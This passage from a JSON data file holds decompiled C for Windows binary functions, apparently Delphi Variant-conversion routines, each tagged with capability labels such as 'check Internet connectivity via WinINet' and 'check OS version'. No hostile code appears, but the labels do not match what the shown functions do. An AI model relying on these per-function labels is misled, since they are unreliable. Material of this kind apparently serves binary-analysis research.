var_18h = &stack0xfffffffc;\n        if (*0x48344c != '\\0') {\n            var_18h = &stack0xfffffffc;\n            fcn.0040fc88();\n        }\n        fcn.0040461c();\n        break;\n    case 2:\n        var_18h = &stack0xfffffffc;\n        fcn.00408c28();\n        fcn.0040461c();\n        break;\n    case 3:\n        var_18h = &stack0xfffffffc;\n        fcn.00408c28();\n        fcn.0040461c();\n        break;\n    case 4:\n        fVar3 = *(param_2 + 4);\n        var_2ch = SUB104(fVar3, 0);\n        var_28h = fVar3 >> 0x20;\n        var_24h._0_1_ = fVar3 >> 0x40;\n        var_18h = &stack0xfffffffc;\n        fcn.0040a3c0(var_2ch);\n        fcn.0040461c(var_2ch, var_28h, var_24h);\n        break;\n    case 5:\n        fVar3 = *(param_2 + 4);\n        var_2ch = SUB104(fVar3, 0);\n        var_28h = fVar3 >> 0x20;\n        var_24h._0_1_ = fVar3 >> 0x40;\n        var_18h = &stack0xfffffffc;\n        fcn.0040a3c0(var_2ch);\n        fcn.0040461c(var_2ch, var_28h, var_24h);\n        break;\n    case 6:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.00413784(var_28h, *(param_2 + 6));\n        fcn.00404850();\n        break;\n    case 7:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.004137bc(var_28h, *(param_2 + 6));\n        fcn.00404850();\n        break;\n    case 8:\n        var_18h = &stack0xfffffffc;\n        fcn.00404ed0(&fcn.00413a6c::var_1ch);\n        var_28h = 0x413bff;\n        fcn.00404850();\n        break;\n    case 9:\n    case 0xd:\n        var_18h = &stack0xfffffffc;\n        fcn.004138b8();\n        fcn.0040461c();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            var_18h = &stack0xfffffffc;\n            fcn.0040461c();\n        }\n        else if (uVar1 == 0x101) {\n            var_18h = &stack0xfffffffc;\n            fcn.00413984();\n            fcn.0040461c();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            var_18h = &stack0xfffffffc;\n            fcn.004045c8();\n            cVar2 = fcn.004139e8();\n            if (cVar2 == '\\0') {\n                fcn.004138b8();\n                fcn.0040461c();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x413d2f\n            switch(uVar1 & 0xbfff) {\n            default:\n                var_18h = &stack0xfffffffc;\n                fcn.004138b8();\n                fcn.0040461c();\n                break;\n            case 2:\n                var_18h = &stack0xfffffffc;\n                fcn.00408c28();\n                fcn.0040461c();\n                break;\n            case 3:\n                var_18h = &stack0xfffffffc;\n                fcn.00408c28();\n                fcn.0040461c();\n                break;\n            case 4:\n                fVar3 = **(param_2 + 4);\n                var_2ch = SUB104(fVar3, 0);\n                var_28h = fVar3 >> 0x20;\n                var_24h._0_1_ = fVar3 >> 0x40;\n                var_18h = &stack0xfffffffc;\n                fcn.0040a3c0(var_2ch);\n                fcn.0040461c(var_2ch, var_28h, var_24h);\n                break;\n            case 5:\n                fVar3 = **(param_2 + 4);\n                var_2ch = SUB104(fVar3, 0);\n                var_28h = fVar3 >> 0x20;\n                var_24h._0_1_ = fVar3 >> 0x40;\n                var_18h = &stack0xfffffffc;\n                fcn.0040a3c0(var_2ch);\n                fcn.0040461c(var_2ch, var_28h, var_24h);\n                break;\n            case 6:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00413784(var_28h, (*(param_2 + 4))[1]);\n                fcn.00404850();\n                break;\n            case 7:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.004137bc(var_28h, (*(param_2 + 4))[1]);\n                fcn.00404850();\n                break;\n            case 8:\n                var_18h = &stack0xfffffffc;\n                fcn.004047f0();\n                break;\n            case 0xb:\n                var_18h = &stack0xfffffffc;\n                fcn.004137f4();\n                fcn.00404850();\n                break;\n            case 0xc:\n                var_18h = &stack0xfffffffc;\n                fcn.00413a6c();\n                break;\n            case 0x10:\n                var_18h = &stack0xfffffffc;\n                fcn.00408c28();\n                fcn.0040461c();\n                break;\n            case 0x11:\n                var_18h = &stack0xfffffffc;\n                fcn.00408c28();\n                fcn.0040461c();\n                break;\n            case 0x12:\n                var_18h = &stack0xfffffffc;\n                fcn.00408c28();\n                fcn.0040461c();\n                break;\n            case 0x13:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00408d14(var_28h);\n                fcn.0040461c(var_28h, 0);\n                break;\n            case 0x14:\n                var_24h._0_1_ = (*(param_2 + 4))[1];\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00408d14(var_28h);\n                fcn.0040461c(var_28h, var_24h);\n            }\n        }\n        break;\n    case 0xb:\n        var_18h = &stack0xfffffffc;\n        fcn.004137f4();\n        fcn.00404850();\n        break;\n    case 0xc:\n        var_18h = &stack0xfffffffc;\n        fcn.00413a6c();\n        break;\n    case 0x10:\n        var_18h = &stack0xfffffffc;\n        fcn.00408c28();\n        fcn.0040461c();\n        break;\n    case 0x11:\n        var_18h = &stack0xfffffffc;\n        fcn.00408c28();\n        fcn.0040461c();\n        break;\n    case 0x12:\n        var_18h = &stack0xfffffffc;\n        fcn.00408c28();\n        fcn.0040461c();\n        break;\n    case 0x13:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.00408d14(var_28h);\n        fcn.0040461c(var_28h, 0);\n        break;\n    case 0x14:\n        var_24h._0_1_ = *(param_2 + 6);\n        var_28h = *(param_2 + 4);\n        fcn.00408d14(var_28h);\n        fcn.0040461c(var_28h, var_24h);\n    }\n    *in_FS_OFFSET = var_28h;\n    var_20h = 0x413fa0;\n    fcn.004045ec();\n    fcn.00404cec();\n    fcn.004045ec();\n    fcn.00404cec();\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 2580
    },
    "004140c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004140c4(uint param_1, uint *param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint pvarg;\n    uint var_14h;\n    int32_t *var_ch;\n    char var_5h;\n    uint *var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    uStack48 = 0x41417c;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x4140f9;\n    var_4h = param_2;\n    var_5h = fcn.00417654();\n    if (var_5h != '\\0') {\n        puStack56 = &fcn.004140c4::pvarg;\n        puStack60 = 0x41410b;\n        sub.oleaut32.dll_VariantInit();\n        uStack64 = 0x41415f;\n        uStack68 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffbc;\n        puStack60 = &stack0xfffffffc;\n        (**(*var_ch + 0x1c))(8);\n        arg_8h = var_4h;\n        fcn.00404de4();\n        fcn.00404ed0(arg_8h);\n        *in_FS_OFFSET = arg_8h;\n        uStack68 = 0x414166;\n        fcn.004104c0();\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x414183;\n    uStack48 = 0x41417b;\n    fcn.00404cd4();\n    return;\n}\n",
        "token_count": 453
    },
    "0041418c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041418c(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    float10 fVar4;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    iVar3 = 0xe;\n    do {\n        var_4h = 0;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_18h = 0x4146d2;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0041418c::var_1ch;\n    uVar1 = *param_2;\n    // switch table (21 cases) at 0x4141c5\n    switch(uVar1) {\n    case 0:\n        var_14h = &stack0xfffffffc;\n        fcn.00404cd4();\n        break;\n    case 1:\n        var_14h = &stack0xfffffffc;\n        if (*0x48344c != '\\0') {\n            var_14h = &stack0xfffffffc;\n            fcn.0040fc88();\n        }\n        fcn.00404e20();\n        break;\n    case 2:\n        var_14h = &stack0xfffffffc;\n        fcn.00408c28();\n        fcn.00404e20();\n        break;\n    case 3:\n        var_14h = &stack0xfffffffc;\n        fcn.00408c28();\n        fcn.00404e20();\n        break;\n    case 4:\n        fVar4 = *(param_2 + 4);\n        var_28h = SUB104(fVar4, 0);\n        var_24h = fVar4 >> 0x20;\n        var_20h._0_1_ = fVar4 >> 0x40;\n        var_14h = &stack0xfffffffc;\n        fcn.0040a3c0(var_28h);\n        fcn.00404e20(var_28h, var_24h, var_20h);\n        break;\n    case 5:\n        fVar4 = *(param_2 + 4);\n        var_28h = SUB104(fVar4, 0);\n        var_24h = fVar4 >> 0x20;\n        var_20h._0_1_ = fVar4 >> 0x40;\n        var_14h = &stack0xfffffffc;\n        fcn.0040a3c0(var_28h);\n        fcn.00404e20(var_28h, var_24h, var_20h);\n        break;\n    case 6:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.00413784(var_24h, *(param_2 + 6));\n        fcn.00404d10();\n        break;\n    case 7:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.004137bc(var_24h, *(param_2 + 6));\n        fcn.00404d10();\n        break;\n    case 8:\n        var_24h = 0x414311;\n        var_14h = &stack0xfffffffc;\n        fcn.00404ed0(in_EAX);\n        break;\n    case 9:\n    case 0xd:\n        var_14h = &stack0xfffffffc;\n        fcn.00413fa8();\n        fcn.00404d10();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            var_14h = &stack0xfffffffc;\n            fcn.00404e20();\n        }\n        else if (uVar1 == 0x101) {\n            var_14h = &stack0xfffffffc;\n            fcn.00414060();\n            fcn.00404d10();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            var_14h = &stack0xfffffffc;\n            fcn.00404cd4();\n            cVar2 = fcn.004140c4();\n            if (cVar2 == '\\0') {\n                fcn.00413fa8();\n                fcn.00404d10();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x414441\n            switch(uVar1 & 0xbfff) {\n            default:\n                var_14h = &stack0xfffffffc;\n                fcn.00413fa8();\n                fcn.00404d10();\n                break;\n            case 2:\n                var_14h = &stack0xfffffffc;\n                fcn.00408c28();\n                fcn.00404e20();\n                break;\n            case 3:\n                var_14h = &stack0xfffffffc;\n                fcn.00408c28();\n                fcn.00404e20();\n                break;\n            case 4:\n                fVar4 = **(param_2 + 4);\n                var_28h = SUB104(fVar4, 0);\n                var_24h = fVar4 >> 0x20;\n                var_20h._0_1_ = fVar4 >> 0x40;\n                var_14h = &stack0xfffffffc;\n                fcn.0040a3c0(var_28h);\n                fcn.00404e20(var_28h, var_24h, var_20h);\n                break;\n            case 5:\n                fVar4 = **(param_2 + 4);\n                var_28h = SUB104(fVar4, 0);\n                var_24h = fVar4 >> 0x20;\n                var_20h._0_1_ = fVar4 >> 0x40;\n                var_14h = &stack0xfffffffc;\n                fcn.0040a3c0(var_28h);\n                fcn.00404e20(var_28h, var_24h, var_20h);\n                break;\n            case 6:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00413784(var_24h, (*(param_2 + 4))[1]);\n                fcn.00404d10();\n                break;\n            case 7:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.004137bc(var_24h, (*(param_2 + 4))[1]);\n                fcn.00404d10();\n                break;\n            case 8:\n                var_14h = &stack0xfffffffc;\n                fcn.00404de4();\n                break;\n            case 0xb:\n                var_14h = &stack0xfffffffc;\n                fcn.004137f4();\n                fcn.00404d10();\n                break;\n            case 0xc:\n                var_14h = &stack0xfffffffc;\n                fcn.0041418c();\n                break;\n            case 0x10:\n                var_14h = &stack0xfffffffc;\n                fcn.00408c28();\n                fcn.00404e20();\n                break;\n            case 0x11:\n                var_14h = &stack0xfffffffc;\n                fcn.00408c28();\n                fcn.00404e20();\n                break;\n            case 0x12:\n                var_14h = &stack0xfffffffc;\n                fcn.00408c28();\n                fcn.00404e20();\n                break;\n            case 0x13:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00408d14(var_24h);\n                fcn.00404e20(var_24h, 0);\n                break;\n            case 0x14:\n                var_20h._0_1_ = (*(param_2 + 4))[1];\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00408d14(var_24h);\n                fcn.00404e20(var_24h, var_20h);\n            }\n        }\n        break;\n    case 0xb:\n        var_14h = &stack0xfffffffc;\n        fcn.004137f4();\n        fcn.00404d10();\n        break;\n    case 0xc:\n        var_14h = &stack0xfffffffc;\n        fcn.0041418c();\n        break;\n    case 0x10:\n        var_14h = &stack0xfffffffc;\n        fcn.00408c28();\n        fcn.00404e20();\n        break;\n    case 0x11:\n        var_14h = &stack0xfffffffc;\n        fcn.00408c28();\n        fcn.00404e20();\n        break;\n    case 0x12:\n        var_14h = &stack0xfffffffc;\n        fcn.00408c28();\n        fcn.00404e20();\n        break;\n    case 0x13:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.00408d14(var_24h);\n        fcn.00404e20(var_24h, 0);\n        break;\n    case 0x14:\n        var_20h._0_1_ = *(param_2 + 6);\n        var_24h = *(param_2 + 4);\n        fcn.00408d14(var_24h);\n        fcn.00404e20(var_24h, var_20h);\n    }\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x4146d9;\n    fcn.00404cec();\n    fcn.004045ec();\n    fcn.00404cec();\n    fcn.004045ec();\n    fcn.00404cec();\n    fcn.004045ec();\n    fcn.00404cec();\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 2591
    },
    "00414758": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414758(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    \n    uVar1 = *param_2;\n    if (uVar1 < 0xe) {\n        if (uVar1 != 0xd) {\n            if (uVar1 == 0) {\n                fcn.00406298();\n                return;\n            }\n            if (uVar1 == 1) {\n                if (*0x48344c != '\\0') {\n                    fcn.0040fc88();\n                }\n                fcn.00406298();\n                return;\n            }\n            if (uVar1 != 9) goto code_r0x004147d9;\n        }\n        fcn.004062b0();\n    }\n    else {\n        if (uVar1 == 0x101) {\n            fcn.004146e0(param_1);\n            return;\n        }\n        if ((uVar1 == 0x4009) || (uVar1 == 0x400d)) {\n            fcn.004062b0();\n            return;\n        }\ncode_r0x004147d9:\n        cVar2 = fcn.00417654();\n        if (cVar2 != '\\0') {\n            fcn.00406298();\n            cVar2 = fcn.004038d4();\n            if (cVar2 != '\\0') {\n                return;\n            }\n        }\n        fcn.0040fc88();\n    }\n    return;\n}\n",
        "token_count": 337
    },
    "00414824": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414824(uint param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    \n    iVar1 = *param_2;\n    if (iVar1 == 0) {\n        fcn.00406298(param_1);\n    }\n    else if (iVar1 == 1) {\n        if (*0x48344c != '\\0') {\n            fcn.0040fc88();\n        }\n        fcn.00406298(param_1);\n    }\n    else if (iVar1 == 9) {\n        fcn.004062b0();\n    }\n    else if (iVar1 == 0x4009) {\n        fcn.004062b0();\n    }\n    else {\n        cVar2 = fcn.00417654();\n        if (cVar2 != '\\0') {\n            fcn.00406298(param_1);\n            cVar2 = fcn.004038d4();\n            if (cVar2 != '\\0') {\n                return;\n            }\n        }\n        fcn.0040fc88();\n    }\n    return;\n}\n",
        "token_count": 248
    },
    "004148d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004148d0(char param_1, uint param_2)\n\n{\n    uint16_t *in_EAX;\n    \n    if ((*in_EAX & 0xbfe8) != 0) {\n        fcn.00410444();\n    }\n    if (*0x483454 == '\\0') {\n        *in_EAX = 3;\n    }\n    else {\n        *in_EAX = *(param_1 * 2 + 0x483484);\n    }\n    *(in_EAX + 4) = param_2;\n    return;\n}\n",
        "token_count": 126
    },
    "00414aa0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414aa0(uint param_1, char param_2)\n\n{\n    uint16_t *in_EAX;\n    \n    if ((*in_EAX & 0xbfe8) != 0) {\n        fcn.00410444();\n    }\n    *in_EAX = 0xb;\n    in_EAX[4] = -(param_2 != '\\0');\n    return;\n}\n",
        "token_count": 90
    },
    "00414ccc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414ccc(int32_t *param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    uint32_t uVar3;\n    \n    if (*param_2 == 0x400c) {\n        fcn.00414ccc();\n        return;\n    }\n    if ((*in_EAX & 0xbfe8) != 0) {\n        fcn.00410444();\n    }\n    uVar1 = *param_2;\n    uVar3 = uVar1;\n    if (0x14 < uVar3) {\n        if (uVar3 == 0x100) {\n            fcn.00414c10();\n            return;\n        }\n        if (uVar3 == 0x101) {\n            fcn.00414c60();\n            return;\n        }\ncode_r0x00414de5:\n        if ((uVar1 & 0x2000) == 0) {\n            if ((uVar1 & 0xfff) < 0x10f) {\n                fcn.004107fc();\n            }\n            else {\n                cVar2 = fcn.00417654();\n                if (cVar2 == '\\0') {\n                    fcn.0040fc34();\n                }\n                else {\n                    (**(*param_1 + 0x20))();\n                }\n            }\n        }\n        else {\n            fcn.00410568();\n        }\n        return;\n    }\n    if (uVar3 != 0x14) {\n        if (uVar3 - 0x10 < 3) {\n            fcn.00410d48();\n            return;\n        }\n        if (uVar3 - 0x10 == 3) {\n            if ((*(param_2 + 0xb) & 0x80) != 0) {\n                fcn.00410d48();\n                return;\n            }\n            fcn.00410d48();\n            return;\n        }\n        goto code_r0x00414de5;\n    }\n    if (*(param_2 + 6) == 0) {\n        if (0x7fffffff < *(param_2 + 4)) goto code_r0x00414da5;\n    }\n    else if (0 < *(param_2 + 6)) goto code_r0x00414da5;\n    if (*(param_2 + 6) == -1) {\n        if (0x7fffffff < *(param_2 + 4)) {\ncode_r0x00414d92:\n            fcn.00410d48();\n            return;\n        }\n    }\n    else if (-2 < *(param_2 + 6)) goto code_r0x00414d92;\ncode_r0x00414da5:\n    if (*0x48345c == '\\0') {\n        fcn.00410d48();\n        return;\n    }\n    fcn.00410d48();\n    return;\n}\n",
        "token_count": 652
    },
    "00414f30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00414f30(uint param_1, char param_2)\n\n{\n    char in_AL;\n    uint uVar1;\n    \n    if (in_AL == '\\x01') {\n        if (param_2 != '\\x01') {\n            return 0;\n        }\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 2;\n    }\n    return uVar1;\n}\n",
        "token_count": 94
    },
    "004152f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.004152f0(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint16_t *in_EAX;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack76;\n    int32_t iStack72;\n    uchar *puStack68;\n    uint *puStack64;\n    uint *puStack60;\n    uint *puStack56;\n    uint pvarg;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    uint var_eh;\n    uint8_t var_9h;\n    int32_t var_8h;\n    uint16_t *var_4h;\n    \n    var_9h = 1;\n    uVar1 = *in_EAX;\n    var_4h = param_2;\n    if ((uVar1 & 0xfff) < 0x10f) {\n        if (uVar1 == 0) {\n            puStack56 = 0x415325;\n            uVar4 = fcn.00414f30();\n            var_9h = uVar4;\n        }\n        else if (uVar1 == 1) {\n            puStack56 = 0x41533f;\n            uVar4 = fcn.00414f44();\n            var_9h = uVar4;\n        }\n        else {\n            puStack56 = 0x415355;\n            cVar3 = fcn.00417654();\n            if (cVar3 == '\\0') {\n                puStack56 = 0x41535e;\n                uVar4 = fcn.0040fd24();\n            }\n            else {\n                puStack56 = &fcn.004152f0::var_eh + 2;\n                puStack60 = 0x415376;\n                cVar3 = (**(*var_18h + 4))();\n                if (cVar3 == '\\0') {\n                    puStack60 = &fcn.004152f0::pvarg;\n                    puStack64 = 0x415435;\n                    sub.oleaut32.dll_VariantInit();\n                    puStack68 = 0x415489;\n                    iStack72 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffffb8;\n                    iStack76 = 0x415451;\n                    puStack64 = &stack0xfffffffc;\n                    fcn.00410d48();\n                    if ((pvarg & 0xfff) != *in_EAX) {\n                        iStack76 = 0x415463;\n                        fcn.0040fc34();\n                    }\n                    iStack76 = 0x415470;\n                    var_9h = fcn.00415164();\n                    *in_FS_OFFSET = iStack72;\n                    puStack64 = 0x415704;\n                    puStack68 = 0x415488;\n                    uVar4 = fcn.004104c0();\n                    return uVar4;\n                }\n                if (*in_EAX != var_eh._2_2_) {\n                    puStack60 = &fcn.004152f0::pvarg;\n                    puStack64 = 0x415390;\n                    sub.oleaut32.dll_VariantInit();\n                    puStack68 = 0x4153fb;\n                    iStack72 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffffb8;\n                    iStack76 = 0x4153ac;\n                    puStack64 = &stack0xfffffffc;\n                    fcn.00410d48();\n                    if ((pvarg & 0xfff) != var_eh._2_2_) {\n                        iStack76 = 0x4153bf;\n                        fcn.0040fc34();\n                    }\n                    iStack76 = var_8h;\n                    uVar4 = (**(*var_18h + 0x34))();\n                    var_9h = *(var_8h * 2 + 0x483474 + (uVar4 & 0x7f));\n                    *in_FS_OFFSET = iStack76;\n                    puStack68 = 0x415704;\n                    iStack72 = 0x4153fa;\n                    uVar4 = fcn.004104c0();\n                    return uVar4;\n                }\n                puStack60 = var_8h;\n                puStack64 = 0x415413;\n                uVar4 = (**(*var_18h + 0x34))();\n                var_9h = *(var_8h * 2 + 0x483474 + (uVar4 & 0x7f));\n                uVar4 = 0;\n            }\n        }\n    }\n    else if (*param_2 == 0) {\n        puStack56 = 0x4154a4;\n        uVar4 = fcn.00414f30();\n        var_9h = uVar4;\n    }\n    else if (*param_2 == 1) {\n        puStack56 = 0x4154c1;\n        uVar4 = fcn.00414f44();\n        var_9h = uVar4;\n    }\n    else {\n        puStack56 = 0x4154d3;\n        cVar3 = fcn.00417654();\n        if (cVar3 == '\\0') {\n            puStack56 = 0x4154dc;\n            uVar4 = fcn.0040fd24();\n        }\n        else {\n            puStack56 = &fcn.004152f0::var_eh;\n            puStack60 = 0x4154f5;\n            cVar3 = (**(*var_14h + 8))();\n            if (cVar3 == '\\0') {\n                if ((*var_4h & 0xfff) < 0x10f) {\n                    puStack60 = &fcn.004152f0::pvarg;\n                    puStack64 = 0x4155c5;\n                    sub.oleaut32.dll_VariantInit();\n                    puStack68 = 0x41561b;\n                    iStack72 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffffb8;\n                    iStack76 = 0x4155e3;\n                    puStack64 = &stack0xfffffffc;\n                    fcn.00410d48();\n                    if (*var_4h != pvarg) {\n                        iStack76 = 0x4155f4;\n                        fcn.0040fc34();\n                    }\n                    iStack76 = 0x415602;\n                    var_9h = fcn.00415164();\n                    *in_FS_OFFSET = iStack72;\n                    puStack64 = 0x415704;\n                    puStack68 = 0x41561a;\n                    uVar4 = fcn.004104c0();\n                    return uVar4;\n                }\n                puStack60 = 0x41562f;\n                cVar3 = fcn.00417654();\n                if (cVar3 == '\\0') {\n                    puStack60 = 0x415638;\n                    uVar4 = fcn.0040fd24();\n                }\n                else {\n                    puStack60 = &fcn.004152f0::var_eh + 2;\n                    puStack64 = 0x415650;\n                    cVar3 = (**(*var_18h + 4))();\n                    if (cVar3 == '\\0') {\n                        puStack64 = 0x415704;\n                        uVar4 = fcn.0040fd24();\n                    }\n                    else {\n                        if (*in_EAX != var_eh._2_2_) {\n                            puStack64 = &fcn.004152f0::pvarg;\n                            puStack68 = 0x41566a;\n                            sub.oleaut32.dll_VariantInit();\n                            iStack72 = 0x4156d1;\n                            iStack76 = *in_FS_OFFSET;\n                            *in_FS_OFFSET = &stack0xffffffb4;\n                            puStack68 = &stack0xfffffffc;\n                            fcn.00410d48();\n                            if (pvarg != var_eh._2_2_) {\n                                fcn.0040fc34();\n                            }\n                            iVar2 = var_8h;\n                            uVar4 = (**(*var_18h + 0x34))();\n                            var_9h = *(var_8h * 2 + 0x483474 + (uVar4 & 0x7f));\n                            *in_FS_OFFSET = iVar2;\n                            iStack72 = 0x415704;\n                            iStack76 = 0x4156d0;\n                            uVar4 = fcn.004104c0();\n                            return uVar4;\n                        }\n                        puStack64 = var_8h;\n                        puStack68 = 0x4156e9;\n                        uVar4 = (**(*var_18h + 0x34))();\n                        var_9h = *(var_8h * 2 + 0x483474 + (uVar4 & 0x7f));\n                        uVar4 = 0;\n                    }\n                }\n            }\n            else {\n                if (*var_4h != var_eh) {\n                    puStack60 = &fcn.004152f0::pvarg;\n                    puStack64 = 0x415512;\n                    sub.oleaut32.dll_VariantInit();\n                    puStack68 = 0x415579;\n                    iStack72 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffffb8;\n                    iStack76 = 0x41552f;\n                    puStack64 = &stack0xfffffffc;\n                    fcn.00410d48();\n                    if (pvarg != var_eh) {\n                        iStack76 = 0x41553e;\n                        fcn.0040fc34();\n                    }\n                    iStack76 = var_8h;\n                    uVar4 = (**(*var_14h + 0x34))();\n                    var_9h = *(var_8h * 2 + 0x483474 + (uVar4 & 0x7f));\n                    *in_FS_OFFSET = iStack76;\n                    puStack68 = 0x415704;\n                    iStack72 = 0x415578;\n                    uVar4 = fcn.004104c0();\n                    return uVar4;\n                }\n                puStack60 = var_8h;\n                puStack64 = 0x415591;\n                uVar4 = (**(*var_14h + 0x34))();\n                var_9h = *(var_8h * 2 + 0x483474 + (uVar4 & 0x7f));\n                uVar4 = 0;\n            }\n        }\n    }\n    return uVar4 & 0xffffff00 | var_9h;\n}\n",
        "token_count": 2364
    },
    "00415a8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
